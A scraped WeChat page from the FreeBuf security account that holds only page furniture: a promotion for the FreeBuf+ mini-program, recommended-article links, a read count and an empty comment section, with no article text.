![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

![](https://res.wx.qq.com/op_res/NN_GToMiIjsXzgPzF9-74ZzwR3cA9-fv3o9eWo8f5gQWqx71CmGlY8kFxuIxZaG0TB1bFeMCmh1DGN_pWMRg0A)

FreeBuf+，，，

FreeBuf+小程序：把安全装进口袋

![](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651139597&idx=1&sn=e13081d6c67e78e274029942d087ce43&chksm=bd1ebc868a69359076078436ff9d90eaea3ea23fdcce8f7a3594a2cab858e5bfcc21f2414c8b&mpshare=1&scene=24&srcid=1001o50b7J9q91RtswnTFVao&sharer_sharetime=1633094651180&sharer_shareid=5fb9813bfe9ffc983435bfc8d8c5e9ca&key=daf9bdc5abc4e8d01ba8abea2b54175f88bbc7b7757caf4c712ecffea81b457aa002675bf1001fdd2e2e31be0603a273c5069f6678f6ac87eb49441a61e4f33311ef0736cfc457d90bbc2e832e8648b346b8c5f15bc65da0f79e48df66901c6e4566db3a49bc09cdab30f95fe667a0ea8ee5bb9cbf4039c888f45e1096bfead5&ascene=0&uin=MTEwNTU1MjgwMw%3D%3D&devicetype=Windows+11+x64&version=63090b19&lang=zh_CN&countrycode=CN&exportkey=n_ChQIAhIQBIyo1m4Madvm6e%2FQXarkCxLmAQIE97dBBAEAAAAAAJcTNjgPw5QAAAAOpnltbLcz9gKNyK89dVj0JF5QWnYAdXtkD1IOm53kbxex269egsqJYc4Fy7qmEm34o%2FGF%2Bxz1fVFgOs8pJuw2bgNjtT4gU%2FLg3aH%2BxDTTzjIxtddPQ%2BRCBRd4VLxzE%2F3XhB8aAkjo8HpSWA5Sx4hA9%2BUAsmcPQe%2FjydGNnm5wHFz39dWSJwwEtIYJUlAjOZMJtKfyl2vo0J1%2BXlYshvaEgJ1Tz56bR%2BIjSuOZp6UWJ%2ByQ2O%2BfKSF2YmOouizo%2B%2FM1KVfhN1N284I9rdQZ5SDE&acctmode=0&pass_ticket=%2B93ET85Azkpisc5k%2FEbNN4zCb2VsLafj5maHGRBPXtBU2EL%2BoYKYbXqMz0Qza18C&wx_header=1&fasttmpl_type=0&fasttmpl_fullversion=7351805-zh_CN-zip&fasttmpl_flag=1)

小程序

  

精彩推荐

  

  

  

  

****![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)****

  

  

[![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486603&idx=1&sn=0bbc6b7df7709de9adad6f432e9bd71f&scene=21#wechat_redirect)

[![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486586&idx=1&sn=8fb235328402751e06c0578e05f3c905&scene=21#wechat_redirect)

[![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486561&idx=1&sn=6457d8dabbab2c32b19defa6f012de23&scene=21#wechat_redirect)

**************![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)**************

阅读原文

阅读 3794

​

写留言

[](javacript:;)

![](http://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibLOEAnkkKa2dHtqcjZ55KLsqibib6n4UDNUhLIuMRdAJ9ibfZkSK5LViaGJLEQN7p9OGo7mNnVv3EmkQ/300?wx_fmt=png&wxfrom=18)

FreeBuf

17311

写留言

写留言

**留言**

暂无留言